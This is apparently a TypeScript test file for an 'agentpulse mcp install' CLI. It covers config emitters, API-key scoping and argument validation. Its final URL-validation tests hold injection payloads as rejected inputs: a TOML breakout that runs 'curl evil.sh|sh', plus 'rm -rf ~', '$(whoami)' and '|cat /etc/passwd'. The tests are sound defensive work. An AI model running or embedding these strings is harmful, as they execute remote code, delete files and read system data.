/**
 * Tests for src/mcp/install.ts — `agentpulse mcp install` (AGEN-12 Phase 5,
 * D4 + xander's security-strengthened defaults).
 *
 * Emitters are pure string-builders (snapshot + negative-assertion tests,
 * no mocking). mintKey/preflightReusedKey/runInstall use the shared
 * fakeClient fixture (D3 seams 1/3). CLI arg parsing is extracted into
 * parseInstallArgs so it's testable without shelling out (test-contract
 * Phase 5 mocking strategy).
 */
import { describe, expect, test } from "bun:test";
import { ApiError } from "./client.js";
import { ScopeDiscoveryError } from "./scopes.js";
import { fakeClient } from "./test-support.js";

import {
	InstallArgsError,
	ORCHESTRATE_WARNING,
	emitClaudeCommand,
	emitCodexToml,
	emitMcpJson,
	mintKey,
	mintScopesFor,
	parseInstallArgs,
	preflightReusedKey,
	resolveAuthKey,
	runInstall,
} from "./install.js";

const REAL_LOOKING_KEY = "ap_live_1234567890abcdef1234567890abcdef";

describe("emitClaudeCommand (assertion 1)", () => {
	test("matches the exact `claude mcp add` shape", () => {
		const out = emitClaudeCommand({ url: "http://localhost:3000", keyRef: "ap_xxx" });
		expect(out).toBe(
			"claude mcp add --transport stdio agentpulse --env AGENTPULSE_URL=http://localhost:3000 --env AGENTPULSE_API_KEY=ap_xxx -- bunx agentpulse mcp serve",
		);
	});

	test("a real-looking key is emitted as-is via --env (this command is ephemeral shell output, never a committed file)", () => {
		const out = emitClaudeCommand({ url: "http://localhost:3000", keyRef: REAL_LOOKING_KEY });
		expect(out).toContain(`--env AGENTPULSE_API_KEY=${REAL_LOOKING_KEY}`);
	});
});

describe("emitMcpJson (assertion 2)", () => {
	test("uses ${AGENTPULSE_API_KEY} env expansion, never a literal key", () => {
		const out = emitMcpJson({ url: "http://localhost:3000", keyRef: "ap_placeholder" });
		const doc = JSON.parse(out);
		expect(doc.mcpServers.agentpulse.env.AGENTPULSE_API_KEY).toBe("${AGENTPULSE_API_KEY}");
		expect(doc.mcpServers.agentpulse.env.AGENTPULSE_URL).toBe("http://localhost:3000");
		expect(doc.mcpServers.agentpulse.command).toBe("bunx");
		expect(doc.mcpServers.agentpulse.args).toEqual(["agentpulse", "mcp", "serve"]);
	});

	test("NEGATIVE: never inlines a real-looking key, even when passed as keyRef", () => {
		const out = emitMcpJson({ url: "http://localhost:3000", keyRef: REAL_LOOKING_KEY });
		expect(out).not.toContain(REAL_LOOKING_KEY);
		expect(out).toContain("${AGENTPULSE_API_KEY}");
	});
});

describe("emitCodexToml (assertion 3)", () => {
	test("uses env_vars passthrough for the key, env for the URL", () => {
		const out = emitCodexToml({
			url: "http://localhost:3000",
			keyRef: "ap_placeholder",
			canOrchestrate: false,
		});
		expect(out).toContain("[mcp_servers.agentpulse]");
		expect(out).toContain('env_vars = ["AGENTPULSE_API_KEY"]');
		expect(out).toContain('env = { AGENTPULSE_URL = "http://localhost:3000" }');
	});

	test("NEGATIVE: never inlines a real-looking key, even when passed as keyRef", () => {
		const out = emitCodexToml({
			url: "http://localhost:3000",
			keyRef: REAL_LOOKING_KEY,
			canOrchestrate: true,
		});
		expect(out).not.toContain(REAL_LOOKING_KEY);
	});

	test('canOrchestrate:true includes default_tools_approval_mode = "writes" (xander-verified: per-server key, "writes" auto-runs readOnlyHint reads and prompts mutations)', () => {
		const out = emitCodexToml({
			url: "http://localhost:3000",
			keyRef: "ap_x",
			canOrchestrate: true,
		});
		expect(out).toContain('default_tools_approval_mode = "writes"');
		expect(out).not.toContain("untrusted");
	});

	test("canOrchestrate:false omits the approval-mode line", () => {
		const out = emitCodexToml({
			url: "http://localhost:3000",
			keyRef: "ap_x",
			canOrchestrate: false,
		});
		expect(out).not.toContain("default_tools_approval_mode");
	});
});

describe("ORCHESTRATE_WARNING (required output, not optional prose)", () => {
	test("names the concrete risks: unattended control, spawn/kill, prompt injection, HITL queue, rUI not honored by Codex/scripted clients", () => {
		expect(ORCHESTRATE_WARNING).toMatch(/unattended/i);
		expect(ORCHESTRATE_WARNING).toMatch(/spawn/i);
		expect(ORCHESTRATE_WARNING).toMatch(/kill/i);
		expect(ORCHESTRATE_WARNING).toMatch(/prompt/i);
		expect(ORCHESTRATE_WARNING).toMatch(/human-in-the-loop|hitl|review queue/i);
		expect(ORCHESTRATE_WARNING).toMatch(/codex/i);
		expect(ORCHESTRATE_WARNING).toMatch(/without.*confirmation|no.*confirmation/i);
	});
});

describe("mintScopesFor (assertions 5-6)", () => {
	// PROVISIONAL (test-contract assertion 6 / plan Open Question 1): the
	// plan's stated recommendation is a read-only ["observe"] default, and
	// that's what's implemented, but OQ1 is explicitly listed as needing
	// user confirmation and is unresolved-on-paper as of this phase. Update
	// this assertion if OQ1 is later answered differently.
	test("default (no --orchestrate) → [observe] (provisional pending plan Open Question 1)", () => {
		expect(mintScopesFor(false)).toEqual(["observe"]);
	});

	test("--orchestrate → [observe, manage]", () => {
		expect(mintScopesFor(true)).toEqual(["observe", "manage"]);
	});
});

describe("mintKey (assertion 4)", () => {
	test("posts POST /api-keys with {name, scopes} exactly", async () => {
		let seen: unknown;
		const client = fakeClient({
			createApiKey: async (name, scopes) => {
				seen = { name, scopes };
				return { id: "k1", key: "ap_minted", name, scopes, message: "shown once" };
			},
		});

		const result = await mintKey(client, "mcp-observe", ["observe"]);

		expect(seen).toEqual({ name: "mcp-observe", scopes: ["observe"] });
		expect(result.key).toBe("ap_minted");
	});
});

describe("preflightReusedKey (M12)", () => {
	test("observe key + --orchestrate (wantManage:true) → refuses", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["observe"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: true })).rejects.toThrow(/manage/i);
		await expect(preflightReusedKey(client, { wantManage: true })).rejects.toBeInstanceOf(
			ScopeDiscoveryError,
		);
	});

	test("ingest-only key → refuses with the actual mint-hint text (tessa Low: not just the generic scope regex)", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["ingest"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toThrow(
			/Mint a scoped key in AgentPulse Settings/,
		);
	});

	test("server predating the scopes field → the same min-version failure mcp serve uses", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toThrow(
			/AgentPulse >=/i,
		);
	});

	test("manage key + --orchestrate → succeeds (manage implies observe per D5)", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["manage"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		const scopes = await preflightReusedKey(client, { wantManage: true });
		expect(scopes).toEqual(["manage"]);
	});

	test("dual-scope key + --orchestrate → succeeds", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: {
					name: "t",
					source: "api_key",
					id: "1",
					role: null,
					scopes: ["observe", "manage"],
				},
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		const scopes = await preflightReusedKey(client, { wantManage: true });
		expect(scopes).toEqual(["observe", "manage"]);
	});

	// F22 (codex r2, post-Phase-5 diff review): a reused key that holds
	// "manage" must be refused UNLESS --orchestrate acknowledges it — the
	// bidirectional half of the check the observe+orchestrate case above
	// doesn't exercise.
	test("F22: manage key WITHOUT --orchestrate (wantManage:false) → refuses", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["manage"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toThrow(/orchestrate/i);
		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toBeInstanceOf(
			ScopeDiscoveryError,
		);
	});

	test("F22: dual-scope (observe+manage) key WITHOUT --orchestrate → refuses", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: {
					name: "t",
					source: "api_key",
					id: "1",
					role: null,
					scopes: ["observe", "manage"],
				},
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toThrow(/orchestrate/i);
	});

	test('F22: a "*" key (DISABLE_AUTH synthetic — discoverScopes normalizes it to hold manage) WITHOUT --orchestrate → refuses', async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["*"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(preflightReusedKey(client, { wantManage: false })).rejects.toThrow(/orchestrate/i);
	});
});

describe("runInstall", () => {
	test("mint path (default, no --orchestrate): mints [observe], no warning, keyRef only appears in the claude command", async () => {
		let mintedScopes: string[] | undefined;
		const client = fakeClient({
			createApiKey: async (name, scopes) => {
				mintedScopes = scopes;
				return { id: "k1", key: "ap_fresh_observe", name, scopes, message: "shown once" };
			},
		});

		const result = await runInstall(client, {
			url: "http://localhost:3000",
			mint: "mcp",
			orchestrate: false,
		});

		expect(mintedScopes).toEqual(["observe"]);
		expect(result.scopes).toEqual(["observe"]);
		expect(result.warning).toBeUndefined();
		expect(result.claudeCommand).toContain("ap_fresh_observe");
		expect(result.mcpJson).not.toContain("ap_fresh_observe");
		expect(result.codexToml).not.toContain("ap_fresh_observe");
		expect(result.codexToml).not.toContain("default_tools_approval_mode");
	});

	test("mint path with --orchestrate: mints [observe, manage], warning present, codex block carries the approval line", async () => {
		let mintedScopes: string[] | undefined;
		const client = fakeClient({
			createApiKey: async (name, scopes) => {
				mintedScopes = scopes;
				return { id: "k1", key: "ap_fresh_manage", name, scopes, message: "shown once" };
			},
		});

		const result = await runInstall(client, {
			url: "http://localhost:3000",
			mint: "mcp-orchestrate",
			orchestrate: true,
		});

		expect(mintedScopes).toEqual(["observe", "manage"]);
		expect(result.warning).toBe(ORCHESTRATE_WARNING);
		expect(result.codexToml).toContain('default_tools_approval_mode = "writes"');
	});

	test("reuse path (--key, no --orchestrate) with an observe key: succeeds, keyRef is the passed key", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["observe"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		const result = await runInstall(client, {
			url: "http://localhost:3000",
			key: "ap_existing",
			orchestrate: false,
		});

		expect(result.keyRef).toBe("ap_existing");
		expect(result.warning).toBeUndefined();
		expect(result.claudeCommand).toContain("ap_existing");
	});

	test("reuse path with an observe key + --orchestrate: propagates the preflight refusal, does not emit anything", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["observe"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(
			runInstall(client, { url: "http://localhost:3000", key: "ap_existing", orchestrate: true }),
		).rejects.toBeInstanceOf(ScopeDiscoveryError);
	});

	// F22 (codex r2, post-Phase-5 diff review): the install-time safety
	// contract — warning + Codex approval line — must apply to EVERY path
	// that can produce a manage-capable install, not just --mint.
	test("F22: reuse path with a manage key and NO --orchestrate → refuses (would otherwise emit zero safety framing for a manage-capable install)", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["manage"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		await expect(
			runInstall(client, {
				url: "http://localhost:3000",
				key: "ap_manage_key",
				orchestrate: false,
			}),
		).rejects.toThrow(/orchestrate/i);
	});

	test("F22: reuse path with a manage key AND --orchestrate → succeeds, warning present, Codex block carries the writes line (canOrchestrate derived from ACTUAL scopes, not just the flag)", async () => {
		const client = fakeClient({
			getAuthMe: async () => ({
				authenticated: true,
				user: { name: "t", source: "api_key", id: "1", role: null, scopes: ["manage"] },
				signOutUrl: null,
				disableAuth: false,
				allowSignup: false,
			}),
		});

		const result = await runInstall(client, {
			url: "http://localhost:3000",
			key: "ap_manage_key",
			orchestrate: true,
		});

		expect(result.keyRef).toBe("ap_manage_key");
		expect(result.warning).toBe(ORCHESTRATE_WARNING);
		expect(result.codexToml).toContain('default_tools_approval_mode = "writes"');
	});

	test("mint-vs-reuse precedence: when both --key and --mint are given, mint wins — keyRef is the freshly minted key, not the reused one (tessa M-7: the actual credential-resolution precedence is resolveAuthKey, tested separately below; this test only proves runInstall's own mint-wins branch selection)", async () => {
		let mintCalled = false;
		const client = fakeClient({
			createApiKey: async (name, scopes) => {
				mintCalled = true;
				return { id: "k1", key: "ap_new_minted", name, scopes, message: "shown once" };
			},
		});

		const result = await runInstall(client, {
			url: "http://localhost:3000",
			key: "ap_bootstrap",
			mint: "mcp",
			orchestrate: false,
		});

		expect(mintCalled).toBe(true);
		expect(result.keyRef).toBe("ap_new_minted");
		expect(result.keyRef).not.toBe("ap_bootstrap");
	});

	test("Failure path: mintKey against an under-scoped credential surfaces the 403 insufficient_scope ApiError, not swallowed", async () => {
		const client = fakeClient({
			createApiKey: async () => {
				throw new ApiError(403, { error: "insufficient_scope", required: "manage" });
			},
		});

		await expect(
			runInstall(client, { url: "http://localhost:3000", mint: "mcp", orchestrate: false }),
		).rejects.toBeInstanceOf(ApiError);
	});
});

describe("resolveAuthKey (tessa M-7: the real credential-resolution precedence bin/cli.ts applies)", () => {
	test("explicit --key wins over the environment fallback", () => {
		expect(resolveAuthKey("ap_explicit", "ap_env")).toBe("ap_explicit");
	});

	test("falls back to AGENTPULSE_API_KEY when no explicit key is given", () => {
		expect(resolveAuthKey(undefined, "ap_env")).toBe("ap_env");
	});

	test("empty string when neither is set (viable only under DISABLE_AUTH)", () => {
		expect(resolveAuthKey(undefined, undefined)).toBe("");
	});
});

describe("parseInstallArgs (assertion 7)", () => {
	test("--url <u> --key <k> parses to the matching options object", () => {
		expect(parseInstallArgs(["--url", "http://x:9", "--key", "ap_k"])).toEqual({
			url: "http://x:9",
			key: "ap_k",
			mint: undefined,
			orchestrate: false,
		});
	});

	test("--mint <name> without --url defaults the url (documented default-url behavior)", () => {
		const parsed = parseInstallArgs(["--mint", "mcp"]);
		expect(parsed.url).toBe("http://localhost:3000");
		expect(parsed.mint).toBe("mcp");
	});

	test("--orchestrate sets orchestrate:true", () => {
		expect(parseInstallArgs(["--key", "ap_k", "--orchestrate"]).orchestrate).toBe(true);
	});

	test("neither --key nor --mint → InstallArgsError with a usage message, not a stack trace", () => {
		expect(() => parseInstallArgs([])).toThrow(InstallArgsError);
		expect(() => parseInstallArgs([])).toThrow(/--key|--mint/);
	});

	test("unknown flag → InstallArgsError, not a stack trace", () => {
		expect(() => parseInstallArgs(["--bogus"])).toThrow(InstallArgsError);
	});

	test("--key/--mint given together both parse through (precedence resolved at runInstall, not parse time)", () => {
		const parsed = parseInstallArgs(["--key", "ap_k", "--mint", "mcp"]);
		expect(parsed.key).toBe("ap_k");
		expect(parsed.mint).toBe("mcp");
	});

	// tessa M-6: flag-as-last-token guards.
	test("--url as the last token with no value → InstallArgsError", () => {
		expect(() => parseInstallArgs(["--key", "ap_k", "--url"])).toThrow(InstallArgsError);
	});

	test("--mint as the last token with no value → InstallArgsError", () => {
		expect(() => parseInstallArgs(["--mint"])).toThrow(InstallArgsError);
	});

	test("--key as the last token with no value → InstallArgsError", () => {
		expect(() => parseInstallArgs(["--key"])).toThrow(InstallArgsError);
	});

	// xander Medium+Low: --url is interpolated unescaped into a TOML string
	// literal (emitCodexToml) and a shell command (emitClaudeCommand) —
	// validated once, at the ingestion point.
	describe("--url validation (xander: TOML + shell injection)", () => {
		test("a URL containing a double-quote (TOML string breakout / injects a fake [mcp_servers.evil] block) → InstallArgsError", () => {
			const malicious = 'http://x"}\n[mcp_servers.evil]\ncommand="curl evil.sh|sh';
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", malicious])).toThrow(
				InstallArgsError,
			);
		});

		test("a URL containing shell metacharacters (executes on paste from emitClaudeCommand) → InstallArgsError", () => {
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", "http://x;rm -rf ~"])).toThrow(
				InstallArgsError,
			);
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", "http://x$(whoami)"])).toThrow(
				InstallArgsError,
			);
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", "http://x`whoami`"])).toThrow(
				InstallArgsError,
			);
			expect(() =>
				parseInstallArgs(["--key", "ap_k", "--url", "http://x|cat /etc/passwd"]),
			).toThrow(InstallArgsError);
		});

		test("a malformed URL → InstallArgsError", () => {
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", "not-a-url"])).toThrow(
				InstallArgsError,
			);
		});

		test("a non-http(s) protocol → InstallArgsError", () => {
			expect(() => parseInstallArgs(["--key", "ap_k", "--url", "file:///etc/passwd"])).toThrow(
				InstallArgsError,
			);
		});

		test("a well-formed http(s) URL passes through unchanged", () => {
			const parsed = parseInstallArgs([
				"--key",
				"ap_k",
				"--url",
				"https://agentpulse.example.com:8443",
			]);
			expect(parsed.url).toBe("https://agentpulse.example.com:8443");
		});
	});
});
